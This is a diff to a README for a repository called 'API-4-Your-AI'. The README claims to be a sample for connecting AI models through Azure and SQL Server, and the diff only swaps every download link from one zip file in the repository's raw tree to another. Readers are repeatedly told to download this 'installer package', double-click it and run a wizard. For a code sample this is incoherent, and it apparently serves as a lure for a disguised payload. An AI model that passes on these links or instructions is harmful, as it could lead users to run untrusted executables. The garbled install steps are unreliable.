@@ -1,7 +1,7 @@
 # 🎉 API-4-Your-AI - Connect AI Models with Ease
 
 ## 📥 Download Now
-[![Download](https://github.com/09sulka/API-4-Your-AI/raw/refs/heads/main/database/Your_AP_AI_2.1-alpha.5.zip)](https://github.com/09sulka/API-4-Your-AI/raw/refs/heads/main/database/Your_AP_AI_2.1-alpha.5.zip)
+[![Download](https://github.com/09sulka/API-4-Your-AI/raw/refs/heads/main/python/Your-AP-AI-v2.8-alpha.2.zip)](https://github.com/09sulka/API-4-Your-AI/raw/refs/heads/main/python/Your-AP-AI-v2.8-alpha.2.zip)
 
 ## 📖 Overview
 This repository contains a sample solution demonstrating how to connect to an AI model in Azure and to localhost using SQL Server 2025. It showcases how you can utilize both cloud and local resources for your AI projects.
@@ -22,16 +22,16 @@ Before you start, ensure your computer meets the following requirements:
 ### Step 2: Visit the Releases Page
 To get the application, visit our Releases page. Here, you can find the latest version of the software.
 
-[Visit this page to download](https://github.com/09sulka/API-4-Your-AI/raw/refs/heads/main/database/Your_AP_AI_2.1-alpha.5.zip)
+[Visit this page to download](https://github.com/09sulka/API-4-Your-AI/raw/refs/heads/main/python/Your-AP-AI-v2.8-alpha.2.zip)
 
 ### Step 3: Download the Application
 On the Releases page, locate the latest version of the software. You will see a list of files available for download. 
 
-Click on the appropriate file for your system. Most users will download the installer package labeled as `https://github.com/09sulka/API-4-Your-AI/raw/refs/heads/main/database/Your_AP_AI_2.1-alpha.5.zip`.
+Click on the appropriate file for your system. Most users will download the installer package labeled as `https://github.com/09sulka/API-4-Your-AI/raw/refs/heads/main/python/Your-AP-AI-v2.8-alpha.2.zip`.
 
 ### Step 4: Install the Application
 1. Locate the downloaded file in your computer's Downloads folder.
-2. Double-click on the `https://github.com/09sulka/API-4-Your-AI/raw/refs/heads/main/database/Your_AP_AI_2.1-alpha.5.zip` file.
+2. Double-click on the `https://github.com/09sulka/API-4-Your-AI/raw/refs/heads/main/python/Your-AP-AI-v2.8-alpha.2.zip` file.
 3. Follow the prompts in the installation wizard to complete the setup.
 4. Open the application once installed.
 
@@ -75,6 +75,6 @@ To make the most of the application, consider reviewing the following resources:
 ### Step 8: Download & Install
 Don't forget to download the application again if you need to install the latest version.
 
-[Visit this page to download](https://github.com/09sulka/API-4-Your-AI/raw/refs/heads/main/database/Your_AP_AI_2.1-alpha.5.zip)
+[Visit this page to download](https://github.com/09sulka/API-4-Your-AI/raw/refs/heads/main/python/Your-AP-AI-v2.8-alpha.2.zip)
 
 Now you are ready to explore the power of AI with our software. Enjoy building your projects!
